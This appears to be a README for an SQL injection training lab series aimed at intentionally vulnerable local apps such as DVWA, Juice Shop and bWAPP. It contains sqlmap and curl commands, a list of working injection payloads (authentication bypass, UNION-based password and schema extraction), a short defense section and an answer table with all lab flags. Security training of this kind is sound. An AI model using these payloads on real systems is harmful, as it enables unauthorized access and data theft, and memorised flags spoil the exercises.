# SQL Injection Labs

Master SQL injection from basic authentication bypass to advanced blind techniques.

## What is SQL Injection?

SQL Injection (SQLi) is a code injection technique that exploits vulnerabilities in applications that incorporate user input into SQL queries. When an application fails to properly sanitize user input, attackers can manipulate the SQL query to:

- Bypass authentication
- Extract sensitive data
- Modify or delete data
- Execute administrative operations
- In some cases, execute system commands

## Lab Series

### Lab 1: SQL Injection Basics
**Difficulty:** Beginner | **Duration:** 45 min | **Target:** DVWA

Learn the fundamentals:
- Understanding SQL query structure
- Basic `' OR '1'='1` payloads
- Authentication bypass
- Error-based information disclosure

### Lab 2: UNION-Based SQL Injection
**Difficulty:** Intermediate | **Duration:** 1 hr | **Target:** DVWA

Master data extraction:
- Determining column count with ORDER BY
- UNION SELECT technique
- Extracting data from information_schema
- Database enumeration

### Lab 3: Blind SQL Injection
**Difficulty:** Advanced | **Duration:** 1.5 hrs | **Target:** Juice Shop

When errors are hidden:
- Boolean-based blind SQLi
- Time-based blind SQLi
- Data extraction character by character
- Automating with sqlmap

### Lab 4: Error-Based SQL Injection
**Difficulty:** Intermediate | **Duration:** 45 min | **Target:** bWAPP

Leveraging error messages:
- Extracting data via error messages
- EXTRACTVALUE/UPDATEXML techniques
- Database fingerprinting

### Lab 5: Second-Order SQL Injection
**Difficulty:** Advanced | **Duration:** 1 hr | **Target:** Custom

Delayed execution attacks:
- Understanding stored vs reflected SQLi
- Registration/profile update attacks
- Exploiting delayed execution

## Tools

```bash
# sqlmap - Automated SQL injection
sqlmap -u "http://localhost:8081/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=xxx;security=low" --dbs

# Manual testing with curl
curl "http://localhost:8081/vulnerabilities/sqli/?id=1'+OR+'1'='1&Submit=Submit" --cookie "PHPSESSID=xxx;security=low"
```

## Common Payloads

```sql
-- Authentication bypass
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
admin'--
' OR 1=1--

-- UNION-based extraction
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT 1,2,3--
' UNION SELECT username,password FROM users--

-- Version detection
' UNION SELECT @@version--
' UNION SELECT version()--

-- Database enumeration
' UNION SELECT schema_name,NULL FROM information_schema.schemata--
' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema='dvwa'--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

## Defense Techniques

Understanding defenses helps craft better attacks:

1. **Parameterized Queries** - Variables bound separately from SQL
2. **Input Validation** - Whitelist allowed characters
3. **Escaping** - Escape special characters
4. **WAF** - Web Application Firewall rules
5. **Least Privilege** - Limited database user permissions

## Flags

| Lab | Flag |
|-----|------|
| Lab 1 | `FLAG{sql_1nj3ct10n_m4st3r}` |
| Lab 2 | `FLAG{un10n_b4s3d_pwn3d}` |
| Lab 3 | `FLAG{bl1nd_sql1_t1m3_b4s3d}` |
| Lab 4 | `FLAG{3rr0r_b4s3d_l34k}` |
| Lab 5 | `FLAG{s3c0nd_0rd3r_pwn}` |

## References

- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)
- [PayloadsAllTheThings SQLi](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection)
